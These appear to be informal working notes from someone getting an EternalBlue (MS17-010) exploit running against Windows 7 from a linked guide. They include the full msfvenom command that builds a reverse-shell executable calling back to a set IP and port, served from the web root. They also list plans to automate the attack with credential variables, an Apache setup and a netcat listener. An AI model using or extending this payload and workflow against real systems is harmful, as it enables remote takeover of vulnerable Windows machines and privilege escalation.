Exploit works, and connects and shell is finally recieved - however the issue was sc.exe was still "old" so find a way to overwrite it? 
mabe delete previous versions it b4 running?

was using this guide:
https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/

sc.exe listens on 192.168.1.6 on port 4444 - and needs to go in a /var/www/html (or other apache/webserver location)
generating sc.exe: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.6 LPORT=4444 -f exe > /var/www/html/sc.exe    (stageless)


note: this NEEDS a valid user/pass to  work making it good for prv esc... metasploit can do it without one but thats metasploit

seems to be win 7 only too rn, untested on 10



to do: make user and pass a variable, along with the msvenom command for IP var and port VAR
	have the exploit be uploaded to /www/var/html auto too + install of apache/start apache
	have a nc listner be set up too automaticlalyl
